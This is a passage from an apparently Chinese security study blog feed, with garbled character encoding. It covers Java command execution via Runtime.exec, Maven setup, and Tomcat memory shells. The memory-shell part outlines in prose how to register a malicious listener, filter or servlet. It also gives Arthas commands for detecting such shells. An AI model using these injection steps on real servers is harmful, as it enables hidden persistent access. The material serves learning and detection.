class="string">&quot;whoami&quot;</span>).getInputStream();</span><br><span class="line">        <span class="comment">// ç”¨æ¥ç¼“å­˜å‘½ä»¤æ‰§è¡Œç»“æœæ•°æ®</span></span><br><span class="line">        <span class="type">byte</span>[] cache = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">readLen</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// readæ–¹æ³•å°†æ•°æ®è¯»å–åˆ°cacheå­—èŠ‚æ•°ç»„ä¸­ï¼Œå¦‚æœè¿”å›-1è¯´æ˜åˆ°äº†ç»“å°¾ï¼Œæ•°æ®è¯»å–å®Œæ¯•</span></span><br><span class="line">        <span class="keyword">while</span> ((readLen = inputStream.read(cache))!=-<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="comment">// æ•°æ®è¯»å–å®Œæ¯•åï¼Œwriteæ–¹æ³•å°†cacheæ•°ç»„ä¸­ä»0åˆ°readlençš„æ•°æ®å†™å…¥è¾“å‡ºæµä¸­</span></span><br><span class="line">            byteArrayOutputStream.write(cache, <span class="number">0</span>, readLen);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(byteArrayOutputStream);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="IDEA"><a href="#IDEA" class="headerlink" title="IDEA"></a>IDEA</h1><p><a href="https://cloud.tencent.com/developer/article/1887019">IDEAä¸­çš„debugæ–­ç‚¹è°ƒè¯•æŠ€å·§ï¼Œå­¦ä¼šçœŸçš„é¦™ï¼ - è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº-è…¾è®¯äº‘</a></p><p><a href="https://blog.csdn.net/gaoqingliang521/article/details/108677301">(72æ¡æ¶ˆæ¯) IntelliJ IDEAåˆ›å»ºServletæœ€æ–°æ–¹æ³• Ideaç‰ˆæœ¬2020.2.2ä»¥åŠIntelliJ IDEAåˆ›å»ºServlet 404é—®é¢˜ï¼ˆè¶…è¯¦ç»†ï¼‰_ideaåˆ›å»ºservleté¡¹ç›®_Granger_gçš„åšå®¢-CSDNåšå®¢</a></p><h2 id="ysoserial-è°ƒè¯•"><a href="#ysoserial-è°ƒè¯•" class="headerlink" title="ysoserial è°ƒè¯•"></a>ysoserial è°ƒè¯•</h2><p>ä¸‹è½½æºç ï¼Œç­‰å¾…mavenå¯¼å…¥ä¾èµ–ï¼Œå†é…ç½®å¦‚ä¸‹å³å¯ï¼ˆjavaç‰ˆæœ¬ä¸ºjava8ï¼‰</p><p>![image-20230502220543589](E:\typora img\image-20230502220543589.png)</p><h1 id="Maven"><a href="#Maven" class="headerlink" title="Maven"></a>Maven</h1><h2 id="æ˜¯ä»€ä¹ˆ"><a href="#æ˜¯ä»€ä¹ˆ" class="headerlink" title="æ˜¯ä»€ä¹ˆ"></a>æ˜¯ä»€ä¹ˆ</h2><blockquote><p>Mavenæ˜¯ä¸€ä¸ªJavaé¡¹ç›®ç®¡ç†å’Œæ„å»ºå·¥å…·ï¼Œå®ƒå¯ä»¥å®šä¹‰é¡¹ç›®ç»“æ„ã€é¡¹ç›®ä¾èµ–ï¼Œå¹¶ä½¿ç”¨ç»Ÿä¸€çš„æ–¹å¼è¿›è¡Œè‡ªåŠ¨åŒ–æ„å»ºï¼Œæ˜¯Javaé¡¹ç›®ä¸å¯ç¼ºå°‘çš„å·¥å…·ã€‚</p></blockquote><h2 id="ä½œç”¨"><a href="#ä½œç”¨" class="headerlink" title="ä½œç”¨"></a>ä½œç”¨</h2><h3 id="ä¾èµ–ç®¡ç†"><a href="#ä¾èµ–ç®¡ç†" class="headerlink" title="ä¾èµ–ç®¡ç†"></a>ä¾èµ–ç®¡ç†</h3><p>![image-20230426102535777](E:\typora img\image-20230426102535777.png)</p><h3 id="æ¨¡å—åŒ–ç®¡ç†"><a href="#æ¨¡å—åŒ–ç®¡ç†" class="headerlink" title="æ¨¡å—åŒ–ç®¡ç†"></a>æ¨¡å—åŒ–ç®¡ç†</h3><p>æŠŠä¸€ä¸ªé¡¹ç›®åˆ†æˆå¤šä¸ªæ¨¡å—</p><p>![image-20230426102935510](E:\typora img\image-20230426102935510.png)</p><p>Mavençš„ä¸­å¤®ä»“åº“ï¼Œå­˜å‚¨å„ç§æ¨¡å—ï¼Œä¾‹å¦‚ï¼Œæˆ‘ä»¬ä½¿ç”¨commons loggingã€log4jè¿™äº›ç¬¬ä¸‰æ–¹æ¨¡å—ï¼Œå°±æ˜¯ç¬¬ä¸‰æ–¹æ¨¡å—çš„å¼€å‘è€…è‡ªå·±æŠŠç¼–è¯‘å¥½çš„jaråŒ…å‘å¸ƒåˆ°Mavençš„ä¸­å¤®ä»“åº“ä¸­ã€‚</p><h2 id="æ›´æ¢ä¸­å¤®ä»“åº“æº"><a href="#æ›´æ¢ä¸­å¤®ä»“åº“æº" class="headerlink" title="æ›´æ¢ä¸­å¤®ä»“åº“æº"></a>æ›´æ¢ä¸­å¤®ä»“åº“æº</h2><p>ä¿®æ”¹ maven æ ¹ç›®å½•ä¸‹çš„ conf æ–‡ä»¶å¤¹ä¸­çš„ settings.xml æ–‡ä»¶ï¼Œåœ¨ mirrors èŠ‚ç‚¹ä¸Šï¼Œæ·»åŠ å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">id</span>&gt;</span>aliyunmaven<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>*<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>é˜¿é‡Œäº‘å…¬å…±ä»“åº“<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">url</span>&gt;</span>https://maven.aliyun.com/repository/public<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="æ’ä»¶"><a href="#æ’ä»¶" class="headerlink" title="æ’ä»¶"></a>æ’ä»¶</h2><p><a href="https://www.runoob.com/maven/maven-plugins.html">https://www.runoob.com/maven/maven-plugins.html</a></p><h2 id="pom-xml"><a href="#pom-xml" class="headerlink" title="pom.xml"></a>pom.xml</h2><p><a href="https://www.runoob.com/maven/maven-pom.html">https://www.runoob.com/maven/maven-pom.html</a></p><p>åŒ…å«äº†é¡¹ç›®çš„åŸºæœ¬ä¿¡æ¯ï¼Œç”¨äºæè¿°é¡¹ç›®å¦‚ä½•æ„å»ºï¼Œå£°æ˜é¡¹ç›®ä¾èµ–ï¼Œç­‰ç­‰ã€‚</p><p>å¼•å…¥å¤–éƒ¨ä¾èµ–</p><blockquote><p>è¦æ·»åŠ ä¾èµ–é¡¹ï¼Œæˆ‘ä»¬ä¸€èˆ¬æ˜¯å…ˆåœ¨ src æ–‡ä»¶å¤¹ä¸‹æ·»åŠ  lib æ–‡ä»¶å¤¹ï¼Œç„¶åå°†ä½ å·¥ç¨‹éœ€è¦çš„ jar æ–‡ä»¶å¤åˆ¶åˆ° lib æ–‡ä»¶å¤¹ä¸‹ã€‚</p></blockquote><h3 id="æ³¨å†Œä¾èµ–"><a href="#æ³¨å†Œä¾èµ–" class="headerlink" title="æ³¨å†Œä¾èµ–"></a>æ³¨å†Œä¾èµ–</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- åœ¨è¿™é‡Œæ·»åŠ ä½ çš„ä¾èµ– --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>ldapjdk<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  <span class="comment">&lt;!-- åº“åç§°ï¼Œä¹Ÿå¯ä»¥è‡ªå®šä¹‰ --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>ldapjdk<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>    <span class="comment">&lt;!--åº“åç§°ï¼Œä¹Ÿå¯ä»¥è‡ªå®šä¹‰--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span> <span class="comment">&lt;!--ç‰ˆæœ¬å·--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>system<span class="tag">&lt;/<span class="name">scope</span>&gt;</span> <span class="comment">&lt;!--ä½œç”¨åŸŸ--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">systemPath</span>&gt;</span>$&#123;basedir&#125;\src\lib\ldapjdk.jar<span class="tag">&lt;/<span class="name">systemPath</span>&gt;</span> <span class="comment">&lt;!--é¡¹ç›®æ ¹ç›®å½•ä¸‹çš„libæ–‡ä»¶å¤¹ä¸‹--&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="é¡¹ç›®ç»“æ„"><a href="#é¡¹ç›®ç»“æ„" class="headerlink" title="é¡¹ç›®ç»“æ„"></a>é¡¹ç›®ç»“æ„</h2><p>![image-20230426105518262](E:\typora img\image-20230426105518262.png)</p><h2 id="ä¸Gradleçš„åŒºåˆ«"><a href="#ä¸Gradleçš„åŒºåˆ«" class="headerlink" title="ä¸Gradleçš„åŒºåˆ«"></a>ä¸Gradleçš„åŒºåˆ«</h2><p><a href="https://www.runoob.com/maven/maven-plugins.html">https://www.runoob.com/maven/maven-plugins.html</a></p><h1 id="JAVA-Agent"><a href="#JAVA-Agent" class="headerlink" title="JAVA Agent"></a>JAVA Agent</h1><h1 id="å†…å­˜é©¬"><a href="#å†…å­˜é©¬" class="headerlink" title="å†…å­˜é©¬"></a>å†…å­˜é©¬</h1><p><a href="https://www.anquanke.com/post/id/279160#h3-1">å†…å­˜é©¬æ¢ç©¶-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å°</a></p><p><a href="https://trrqsec.github.io/2022/04/10/Java%E5%AE%89%E5%85%A8-Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/">Javaå®‰å…¨-Tomcatå†…å­˜é©¬å­¦ä¹ -ä¿¡æ¯å®‰å…¨åšå®¢</a></p><p><a href="http://wjlshare.com/archives/1529">Tomcat å†…å­˜é©¬å­¦ä¹ (ä¸€)ï¼šFilterå‹ â€“ å¤©ä¸‹å¤§æœ¨å¤´</a></p><p><a href="https://www.freebuf.com/articles/web/343105.html">Tomcat Filter å‹å†…å­˜é©¬æµç¨‹ç†è§£ä¸æ‰‹å†™ EXP - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p><p><a href="https://www.cnblogs.com/whgk/p/6399262.html">Java Web(ä¸€) Servletè¯¦è§£ï¼ï¼ - æœ‰æ¢¦æƒ³çš„è€ç‹ - åšå®¢å›­</a></p><h2 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h2><p>![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](E:\typora img\201909251250360.png)</p><blockquote><p>å®¢æˆ·ç«¯å‘èµ·ä¸€ä¸ªhttpè¯·æ±‚ï¼Œæ¯”å¦‚getç±»å‹ã€‚</p><p>Tomcat ä½œä¸ºServletå®¹å™¨,å°†httpè¯·æ±‚æ–‡æœ¬æ¥æ”¶å¹¶è§£æï¼Œç„¶åå°è£…æˆHttpServletRequestç±»å‹çš„requestå¯¹è±¡ï¼Œä¼ é€’ç»™servletï¼›</p><p>Servletå®¹å™¨æ¥æ”¶åˆ°è¯·æ±‚ï¼Œæ ¹æ®è¯·æ±‚ä¿¡æ¯ï¼Œå°è£…æˆHttpServletRequestå’ŒHttpServletResponseå¯¹è±¡ã€‚<br>Servletå®¹å™¨è°ƒç”¨HttpServletçš„init()æ–¹æ³•ï¼Œinitæ–¹æ³•åªåœ¨ç¬¬ä¸€æ¬¡è¯·æ±‚çš„æ—¶å€™è¢«è°ƒç”¨ã€‚<br>Servletå®¹å™¨è°ƒç”¨service()æ–¹æ³•ã€‚<br>service()æ–¹æ³•æ ¹æ®è¯·æ±‚ç±»å‹ï¼Œè¿™é‡Œæ˜¯getç±»å‹ï¼Œåˆ†åˆ«è°ƒç”¨doGetæˆ–è€…doPostæ–¹æ³•ï¼Œè¿™é‡Œè°ƒç”¨doGetæ–¹æ³•ã€‚<br>doXXXæ–¹æ³•ä¸­æ˜¯æˆ‘ä»¬è‡ªå·±å†™çš„ä¸šåŠ¡é€»è¾‘ã€‚</p><p>ä¸šåŠ¡é€»è¾‘å¤„ç†å®Œæˆä¹‹åï¼Œè¿”å›ç»™Servletå®¹å™¨ï¼ŒServletå®¹å™¨ä¼šå°†å“åº”çš„ä¿¡æ¯å°è£…ä¸ºHttpServletResponseç±»å‹çš„responseå¯¹è±¡ï¼Œç„¶åå°†responseäº¤ç»™tomcatï¼Œtomcatå°±ä¼šå°†å…¶å˜æˆå“åº”æ–‡æœ¬çš„æ ¼å¼å‘é€ç»™æµè§ˆå™¨ï¼Œç„¶åå®¹å™¨å°†ç»“æœè¿”å›ç»™å®¢æˆ·ç«¯ã€‚</p><p>å®¹å™¨å…³é—­æ—¶å€™ï¼Œä¼šè°ƒç”¨destoryæ–¹æ³•</p></blockquote><p>Tomcatçš„é…ç½®</p><p>![img](E:\typora img\v2-c3adc47d4c42dae472308ca19eb84374_720w.webp)</p><ul><li>Server å…ƒç´ è¡¨ç¤ºæ•´ä¸ª Catalina servlet å®¹å™¨ã€‚</li><li>Serviceå…ƒç´ è¡¨ç¤ºä¸€ä¸ªæˆ–å¤šä¸ªè¿æ¥å™¨ç»„ä»¶çš„ç»„åˆï¼Œè¿™äº›ç»„ä»¶å…±äº«ä¸€ä¸ªç”¨äºå¤„ç†ä¼ å…¥è¯·æ±‚çš„å¼•æ“ç»„ä»¶ã€‚Server ä¸­å¯ä»¥æœ‰å¤šä¸ª Serviceã€‚</li><li>Executorè¡¨ç¤ºå¯ä»¥åœ¨Tomcatä¸­çš„ç»„ä»¶ä¹‹é—´å…±äº«çš„çº¿ç¨‹æ± ã€‚</li><li>Connectorä»£è¡¨è¿æ¥ç»„ä»¶ã€‚Tomcat æ”¯æŒä¸‰ç§åè®®ï¼šHTTP&#x2F;1.1ã€HTTP&#x2F;2.0ã€AJPã€‚</li><li>Contextå…ƒç´ è¡¨ç¤ºä¸€ä¸ªWebåº”ç”¨ç¨‹åºï¼Œå®ƒåœ¨ç‰¹å®šçš„è™šæ‹Ÿä¸»æœºä¸­è¿è¡Œã€‚æ¯ä¸ªWebåº”ç”¨ç¨‹åºéƒ½åŸºäºWebåº”ç”¨ç¨‹åºå­˜æ¡£ï¼ˆWARï¼‰æ–‡ä»¶ï¼Œæˆ–è€…åŒ…å«ç›¸åº”çš„è§£åŒ…å†…å®¹çš„ç›¸åº”ç›®å½•ï¼Œå¦‚Servletè§„èŒƒè¿°ã€‚</li><li>Engineå…ƒç´ è¡¨ç¤ºä¸ç‰¹å®šçš„CatalinaæœåŠ¡ç›¸å…³è”çš„æ•´ä¸ªè¯·æ±‚å¤„ç†æœºå™¨ã€‚å®ƒæ¥æ”¶å¹¶å¤„ç†æ¥è‡ªä¸€ä¸ªæˆ–å¤šä¸ªè¿æ¥å™¨çš„æ‰€æœ‰è¯·æ±‚ï¼Œå¹¶å°†å®Œæˆçš„å“åº”è¿”å›ç»™è¿æ¥å™¨ï¼Œä»¥ä¾¿æœ€ç»ˆä¼ è¾“å›å®¢æˆ·ç«¯ã€‚</li><li>Hostå…ƒç´ è¡¨ç¤ºä¸€ä¸ªè™šæ‹Ÿä¸»æœºï¼Œå®ƒæ˜¯ä¸€ä¸ªæœåŠ¡å™¨çš„ç½‘ç»œåç§°ï¼ˆå¦‚â€œ<a href="http://www.mycompany.comâ€)ä¸è¿è¡Œtomcatçš„ç‰¹å®šæœåŠ¡å™¨çš„å…³è”./">www.mycompany.comâ€ï¼‰ä¸è¿è¡ŒTomcatçš„ç‰¹å®šæœåŠ¡å™¨çš„å…³è”ã€‚</a></li></ul><p>![img](E:\typora img\1622447564_60b495cc4ddf6ab5c7b98.png!small)</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Engineï¼Œå®ç°ç±»ä¸º org.apache.catalina.core.StandardEngine</span><br><span class="line">Hostï¼Œå®ç°ç±»ä¸º org.apache.catalina.core.StandardHost</span><br><span class="line">Contextï¼Œå®ç°ç±»ä¸º org.apache.catalina.core.StandardContext</span><br><span class="line">Wrapperï¼Œå®ç°ç±»ä¸º org.apache.catalina.core.StandardWrapper</span><br></pre></td></tr></table></figure><p>Tomcatå¯åŠ¨åŠ è½½çš„é¡ºåºï¼šListener -&gt; Filter -&gt; Servlet</p><h2 id="ä¼ ç»Ÿwebåº”ç”¨å‹"><a href="#ä¼ ç»Ÿwebåº”ç”¨å‹" class="headerlink" title="ä¼ ç»Ÿwebåº”ç”¨å‹"></a>ä¼ ç»Ÿwebåº”ç”¨å‹</h2><h3 id="listenerç±»å‹"><a href="#listenerç±»å‹" class="headerlink" title="listenerç±»å‹"></a>listenerç±»å‹</h3><p>æœ€ç»ˆå®ä¾‹åŒ–å‡ºæ¥çš„ç›‘å¬å™¨è¢«å­˜å‚¨åœ¨ <code>applicationEventListenersList</code> å±æ€§ä¸­</p><p>æ‰€ä»¥å†…å­˜é©¬æ„é€ ä¸­éœ€è¦è·å–åˆ° StandardContext ç±»ï¼Œç„¶åè·å–å…¶applicationEventListenersList å±æ€§ï¼Œæœ€åæ³¨å…¥æˆ‘ä»¬æ„é€ çš„æ¶æ„ç›‘å¬å™¨åˆ° applicationEventListenersList å±æ€§é‡Œ</p><h3 id="filterç±»å‹"><a href="#filterç±»å‹" class="headerlink" title="filterç±»å‹"></a>filterç±»å‹</h3><p><a href="http://wjlshare.com/archives/1529">Tomcat å†…å­˜é©¬å­¦ä¹ (ä¸€)ï¼šFilterå‹ â€“ å¤©ä¸‹å¤§æœ¨å¤´</a></p><p><strong>åŠ¨æ€æ³¨å†Œæ¶æ„ Filterï¼Œå¹¶ä¸”å°†å…¶æ”¾åˆ° <code>filterChain </code>çš„æœ€å‰é¢</strong></p><h4 id="filterè¿‡æ»¤å™¨å·¥ä½œåŸç†"><a href="#filterè¿‡æ»¤å™¨å·¥ä½œåŸç†" class="headerlink" title="filterè¿‡æ»¤å™¨å·¥ä½œåŸç†"></a>filterè¿‡æ»¤å™¨å·¥ä½œåŸç†</h4><p>![image-20210331212905616](E:\typora img\image-20210331212905616.png)</p><ol><li>æ ¹æ®è¯·æ±‚çš„ URL ä» <code>FilterMaps</code> ä¸­éå†<code>FilterMap</code>æ‰¾å‡ºä¸ä¹‹ URL å¯¹åº”çš„ Filter åç§°</li><li>æ ¹æ® Filter åç§°å» <code>FilterConfigs</code> ä¸­å¯»æ‰¾å¯¹åº”åç§°çš„ <code>FilterConfig</code></li><li>æ‰¾åˆ°å¯¹åº”çš„ <code>FilterConfig</code> ä¹‹åæ·»åŠ åˆ°<code> FilterChain</code>ä¸­ï¼Œå¹¶ä¸”è¿”å› <code>FilterChain</code></li><li><code>filterChain </code>ä¸­è°ƒç”¨ <code>internalDoFilter</code> éå†è·å– chain ä¸­çš„ <code>FilterConfig </code>ï¼Œç„¶åä»<code> FilterConfig</code> ä¸­è·å– Filterï¼Œç„¶åè°ƒç”¨ Filter çš„ doFilter æ–¹æ³•</li></ol><blockquote><p>å…³é”®ç‚¹åœ¨äº<code>FilterMap</code>å’Œ<code>FilterConfig</code>ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥æ§åˆ¶è¿™ä¸¤ä¸ªå˜é‡ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä»»æ„æ³¨å†Œfilterã€‚</p><p>ä»–ä»¬å­˜å‚¨åœ¨<code>StandardContext</code>çš„å±æ€§<code>FilterMaps</code>å’Œ<code>FilterConfigs</code>ä¸­ï¼Œè€Œ<code>StandardContext</code>æ˜¯å¯ä»¥è·å¾—çš„ï¼Œ<code>filterconfig</code>ä¸­éœ€è¦æ·»åŠ çš„<code>filterdef</code>ä¹Ÿæ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œç»¼ä¸ŠfilteråŠ¨æ€æ·»åŠ è¿‡ç¨‹æ˜¯æˆ‘ä»¬å¯æ“æ§çš„ã€‚</p></blockquote><p>![image-20230424230657970](E:\typora img\image-20230424230657970.png)</p><ul><li><p><code>filterConfigs</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å­˜æ”¾filterConfigçš„æ•°ç»„ï¼Œåœ¨ FilterConfig ä¸­ä¸»è¦å­˜æ”¾ FilterDef å’Œ Filterå¯¹è±¡ç­‰ä¿¡æ¯</span><br></pre></td></tr></table></figure></li><li><p><code>filterDefs</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å­˜æ”¾FilterDefçš„æ•°ç»„ ï¼ŒFilterDef ä¸­å­˜å‚¨ç€æˆ‘ä»¬è¿‡æ»¤å™¨åï¼Œè¿‡æ»¤å™¨å®ä¾‹ï¼Œä½œç”¨ url ç­‰åŸºæœ¬ä¿¡æ¯</span><br></pre></td></tr></table></figure></li><li><p><code>filterMaps</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å­˜æ”¾FilterMapçš„æ•°ç»„ï¼Œåœ¨ FilterMap ä¸­ä¸»è¦å­˜æ”¾äº† FilterName å’Œ å¯¹åº”çš„URLPattern</span><br></pre></td></tr></table></figure></li></ul><p>æ€è·¯ï¼š</p><ol><li>åˆ›å»ºä¸€ä¸ªæ¶æ„ Filter</li><li>åˆ©ç”¨ FilterDef å¯¹ Filter è¿›è¡Œä¸€ä¸ªå°è£…</li><li>å°† FilterDef æ·»åŠ åˆ° FilterDefs å’Œ FilterConfig</li><li>åˆ›å»º FilterMap ï¼Œå°†æˆ‘ä»¬çš„ Filter å’Œ urlpattern ç›¸å¯¹åº”ï¼Œå­˜æ”¾åˆ° filterMapsä¸­ï¼ˆç”±äº Filter ç”Ÿæ•ˆä¼šæœ‰ä¸€ä¸ªå…ˆåé¡ºåºï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸€èˆ¬éƒ½æ˜¯æ”¾åœ¨æœ€å‰é¢ï¼Œè®©æˆ‘ä»¬çš„ Filter æœ€å…ˆè§¦å‘ï¼‰</li></ol><img src="E:\typora img\image-20230424231859397.png" alt="image-20230424231859397" style="zoom: 150%;" /><h3 id="servletç±»å‹"><a href="#servletç±»å‹" class="headerlink" title="servletç±»å‹"></a>servletç±»å‹</h3><p>å·¥ä½œæµç¨‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è£…è½½ï¼šå¯åŠ¨æœåŠ¡å™¨æ—¶åŠ è½½Servletçš„å®ä¾‹</span><br><span class="line"></span><br><span class="line">åˆå§‹åŒ–ï¼šwebæœåŠ¡å™¨å¯åŠ¨æ—¶æˆ–webæœåŠ¡å™¨æ¥æ”¶åˆ°è¯·æ±‚æ—¶ï¼Œæˆ–è€…ä¸¤è€…ä¹‹é—´çš„æŸä¸ªæ—¶åˆ»å¯åŠ¨ã€‚åˆå§‹åŒ–å·¥ä½œæœ‰init()æ–¹æ³•è´Ÿè´£æ‰§è¡Œå®Œæˆ</span><br><span class="line"></span><br><span class="line">è°ƒç”¨ï¼šå³æ¯æ¬¡è°ƒç”¨Servletçš„service()ï¼Œä»ç¬¬ä¸€æ¬¡åˆ°ä»¥åçš„å¤šæ¬¡è®¿é—®ï¼Œéƒ½æ˜¯åªæ˜¯è°ƒç”¨doGet()æˆ–doPost()æ–¹æ³•ï¼ˆdoGetã€doPostå†…éƒ¨å®ç°ï¼Œå…·ä½“å‚ç…§HttpServletç±»service()çš„é‡å†™ï¼‰</span><br><span class="line"></span><br><span class="line">é”€æ¯ï¼šåœæ­¢æœåŠ¡å™¨æ—¶è°ƒç”¨destroy()æ–¹æ³•ï¼Œé”€æ¯å®ä¾‹</span><br></pre></td></tr></table></figure><p>Servletéœ€è¦é‡å†™doGetå’ŒdoPost</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. é€šè¿‡ context.createWapper() åˆ›å»º Wapper å¯¹è±¡ï¼›</span><br><span class="line"></span><br><span class="line">2. è®¾ç½® Servlet çš„ LoadOnStartUp çš„å€¼ï¼›ï¼ˆä¼˜å…ˆçº§ï¼‰</span><br><span class="line"></span><br><span class="line">3. è®¾ç½® Servlet çš„ Nameï¼›</span><br><span class="line"></span><br><span class="line">4. è®¾ç½® Servlet å¯¹åº”çš„ Classï¼›</span><br><span class="line"></span><br><span class="line">5. å°† Servlet æ·»åŠ åˆ° context çš„ children ä¸­ï¼›</span><br><span class="line"></span><br><span class="line">6. å°† url è·¯å¾„å’Œ servlet ç±»åšæ˜ å°„ã€‚</span><br></pre></td></tr></table></figure><h2 id="æ’æŸ¥"><a href="#æ’æŸ¥" class="headerlink" title="æ’æŸ¥"></a>æ’æŸ¥</h2><p>é˜¿é‡Œå·´å·´çš„Javaè¯Šæ–­å·¥å…·â€“é˜¿å°”è¨æ–¯</p><p>æ³¨æ„å¯åŠ¨ç”¨çš„javaç‰ˆæœ¬è¦å’Œå¯åŠ¨tomcatçš„javaç‰ˆæœ¬ä¸€è‡´ï¼Œç”¨æˆ·ä¸€è‡´ã€‚</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">servelt</span></span><br><span class="line">mbean | grep &quot;name=/&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">filter</span></span><br><span class="line">sc *.Filter # æ¨¡ç³Šæœç´¢ï¼Œåˆ—å‡ºæ‰€æœ‰è°ƒç”¨äº† Filter çš„ç±»</span><br><span class="line">sc -d org.apache.coyote.module.SimpleSerializers # classloader</span><br><span class="line"></span><br><span class="line">classloader # æŸ¥çœ‹ç±»åŠ è½½å™¨åŠ è½½äº†å“ªäº›ç±»</span><br><span class="line"></span><br><span class="line">jad --source-only org.apache.jsp.evil_jsp # åç¼–è¯‘ç±»</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ç»ˆææ’æŸ¥ heapdump</span></span><br><span class="line">heapdump</span><br><span class="line">strings /var/cache/tomcat/temp/heapdump2022-10-19-12-464292342944555007800.hprof | grep &quot;POST /&quot;</span><br></pre></td></tr></table></figure><p>![image-20230503204528006](E:\typora img\image-20230503204528006.png)</p><p>![image-20230426163320217](E:\typora img\image-20230426163320217.png)</p><p>åŠ¨æ€æ³¨å†Œï¼Œå¯¹æ¯”<code>web.xml</code>ä¸­çš„é…ç½®</p><h1 id="æŠ¥é”™è§£å†³"><a href="#æŠ¥é”™è§£å†³" class="headerlink" title="æŠ¥é”™è§£å†³"></a>æŠ¥é”™è§£å†³</h1><p><a href="https://blog.csdn.net/qq_22076345/article/details/82392236">(69æ¡æ¶ˆæ¯) Intellij idea æŠ¥é”™ï¼šError : java ä¸æ”¯æŒå‘è¡Œç‰ˆæœ¬5_ideaé”™è¯¯ä¸æ”¯æŒå‘è¡Œç‰ˆæœ¬5_çµé¢–æ¡¥äººçš„åšå®¢-CSDNåšå®¢</a></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JNDIæ³¨å…¥</title>
      <link href="/2023/05/01/JNDI/"/>
      <url>/2023/05/01/JNDI/</url>
      
        <content type="html"><![CDATA[<h2 id="ä»€ä¹ˆæ˜¯JNDI"><a href="#ä»€ä¹ˆæ˜¯JNDI" class="headerlink" title="ä»€ä¹ˆæ˜¯JNDI"></a>ä»€ä¹ˆæ˜¯JNDI</h2><p><code>JNDI(Java Naming and Directory Interface)</code>æ˜¯<code>Java</code>æä¾›çš„<code>Java</code>å‘½åå’Œç›®å½•æ¥å£ã€‚</p><blockquote><p>Naming Service å‘½åæœåŠ¡ï¼šå‘½åæœåŠ¡å°†åç§°å’Œå¯¹è±¡è¿›è¡Œå…³è”ï¼Œæä¾›é€šè¿‡åç§°æ‰¾åˆ°å¯¹è±¡çš„æ“ä½œ</p><p>Directory 